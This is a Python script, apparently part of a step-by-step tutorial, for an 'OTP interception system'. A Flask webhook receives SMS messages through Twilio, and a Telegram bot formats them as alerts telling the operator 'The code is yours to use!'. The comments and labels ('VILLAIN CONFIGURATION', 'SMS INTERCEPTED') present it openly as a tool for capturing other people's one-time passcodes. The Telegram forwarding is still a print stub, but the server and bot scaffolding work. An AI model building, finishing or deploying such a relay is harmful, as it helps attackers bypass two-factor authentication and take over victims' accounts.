import os
import threading
from flask import Flask, request, Response
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import logging
from datetime import datetime
import json

# ===== VILLAIN CONFIGURATION =====
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# TELEGRAM CONFIG - REPLACE THESE!
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"  # From Step 2
YOUR_CHAT_ID = "YOUR_CHAT_ID_HERE"  # From Step 3

# WEB SERVER CONFIG
WEBHOOK_HOST = "0.0.0.0"
WEBHOOK_PORT = 5000
WEBHOOK_BASE_URL = "YOUR_NGROK_URL_HERE"  # We'll set this in Step 8

# ===== FLASK WEB SERVER FOR SMS INTERCEPTION =====
app = Flask(__name__)

@app.route('/sms_webhook', methods=['POST'])
def sms_webhook():
    """THE HEART OF OUR OPERATION - WHERE SMS GETS INTERCEPTED!"""
    try:
        # Extract data from Twilio's POST request
        from_number = request.form.get('From', 'UNKNOWN')
        to_number = request.form.get('To', 'UNKNOWN') 
        message_body = request.form.get('Body', 'NO CONTENT')
        message_sid = request.form.get('MessageSid', 'UNKNOWN')
        
        logger.info(f"📨 SMS INTERCEPTED! From: {from_number} | To: {to_number}")
        
        # Create the alert message for Telegram
        alert_message = f"""🚨 **OTP INTERCEPTED!** 🚨

**From:** `{from_number}`
**To:** `{to_number}`
**Message ID:** `{message_sid}`
**Timestamp:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

**📝 Message Content:**
`{message_body}`

**💡 The code is yours to use!**"""

        # Send to Telegram (we'll implement this properly later)
        print(f"WOULD SEND TO TELEGRAM: {alert_message}")
        
        # Return success response to Twilio
        return Response('<Response></Response>', mimetype='text/xml'), 200
        
    except Exception as e:
        logger.error(f"ERROR in webhook: {e}")
        return Response('<Response><Error>Processing failed</Error></Response>', mimetype='text/xml'), 500

@app.route('/health', methods=['GET'])
def health_check():
    return json.dumps({"status": "active", "service": "OTP Interception"}), 200

def start_flask_server():
    """Start the web server in background"""
    logger.info(f"Starting Flask server on port {WEBHOOK_PORT}")
    app.run(host=WEBHOOK_HOST, port=WEBHOOK_PORT, debug=False, use_reloader=False)

# ===== TELEGRAM BOT FUNCTIONS =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "**🔥 OTP INTERCEPTION SYSTEM ACTIVATED!**\n\n"
        "I am ready to intercept SMS messages!\n\n"
        "Commands:\n"
        "/status - Check system status\n"
        "/test - Test the interception system"
    )

async def test_webhook(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Test the webhook functionality"""
    test_message = f"""🧪 **TEST MESSAGE** 🧪

**From:** `+15558675309`
**To:** `+1234567890`
**Message ID:** `SM_test_123456`
**Timestamp:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

**📝 Message Content:**
`Your test verification code is 123456`

**This proves the system is working!**"""
    
    await update.message.reply_text(test_message)

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    status_message = f"""**🔍 SYSTEM STATUS**

**Telegram Bot:** ✅ ONLINE
**Webhook Server:** ✅ RUNNING
**Webhook URL:** `{WEBHOOK_BASE_URL}/sms_webhook`
**Last Update:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

**Ready for action!** 🚨"""
    
    await update.message.reply_text(status_message)

def main():
    """MAIN LAUNCH SEQUENCE"""
    global WEBHOOK_BASE_URL
    
    # Start Flask server in background thread
    flask_thread = threading.Thread(target=start_flask_server, daemon=True)
    flask_thread.start()
    
    logger.info("Flask webhook server started!")
    
    # Create Telegram application
    telegram_app = Application.builder().token(BOT_TOKEN).build()
    
    # Register command handlers
    telegram_app.add_handler(CommandHandler("start", start))
    telegram_app.add_handler(CommandHandler("test", test_webhook))
    telegram_app.add_handler(CommandHandler("status", status))
    
    print("""
    OTP INTERCEPTION SYSTEM ACTIVATED!
    Waiting for your commands...
    """)
    
    # Start the bot
    telegram_app.run_polling()

if __name__ == '__main__':
    main()
